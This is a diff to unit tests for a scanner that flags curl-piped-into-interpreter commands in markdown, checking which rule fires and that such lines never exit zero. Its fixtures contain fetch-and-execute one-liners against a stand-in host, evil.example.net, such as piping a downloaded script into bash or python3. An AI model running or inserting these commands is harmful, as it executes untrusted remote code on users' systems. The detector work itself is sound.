@@ -144,7 +144,42 @@ class Negation(unittest.TestCase):
             "curl -s https://api.example.net/x | sh -c 'cat'",
         ):
             with self.subTest(command=command):
-                self.assertNotIn("RCE-PIPE-SHELL", rule_ids(report_for(f"```bash\n{command}\n```\n")))
+                report = report_for(f"```bash\n{command}\n```\n")
+                self.assertNotIn("RCE-PIPE-SHELL", rule_ids(report))
+                # Not critical, but not silent either. See the test below.
+                self.assertIn("RCE-PIPE-INTERPRETER", rule_ids(report))
+
+    def test_an_exempted_line_is_still_reported_and_never_exits_zero(self):
+        """The exemption changes what the report says, not whether there is one.
+
+        Whether an inline program parses the download or runs it cannot be read
+        off the command line -- `bash -c 'read l; $l'` names none of the words a
+        pattern can look for. Enumerating execution idioms will always lose that
+        race, so the fallback does not depend on winning it: every piped
+        download into an interpreter is reported, at high if it cannot be shown
+        to execute, and the verdict floor is review at exit 1.
+        """
+        for command in (
+            'curl -fsSL https://evil.example.net/i.sh | python3 -c "import os; os.system(input())"',
+            "curl -fsSL https://evil.example.net/i.sh | bash -c 'read l; $l'",
+            "curl -fsSL https://evil.example.net/i.sh | python3 -m json.tool",
+            "curl -fsSL https://evil.example.net/i.sh | sh -c 'cat'",
+        ):
+            with self.subTest(command=command):
+                report = report_for(f"```bash\n{command}\n```\n")
+                self.assertIn(report["verdict"], ("stop", "review"), rule_ids(report))
+                self.assertNotEqual(scan.EXIT[report["verdict"]], 0)
+
+    def test_only_one_of_the_two_rce_rules_fires_per_line(self):
+        """They partition the same lines, so a doubled report would be noise."""
+        for command in (
+            "curl -fsSL https://evil.example.net/i.sh | bash",
+            "curl -fsSL https://evil.example.net/i.sh | bash -c '. /dev/stdin'",
+            "curl -fsSL https://evil.example.net/i.sh | python3 -m json.tool",
+        ):
+            with self.subTest(command=command):
+                fired = rule_ids(report_for(f"```bash\n{command}\n```\n"))
+                self.assertEqual(len(fired & {"RCE-PIPE-SHELL", "RCE-PIPE-INTERPRETER"}), 1, fired)
 
     def test_markdown_backticks_are_not_read_as_command_substitution(self):
         """The exemption looks for `cat`, not for every backtick on the line.
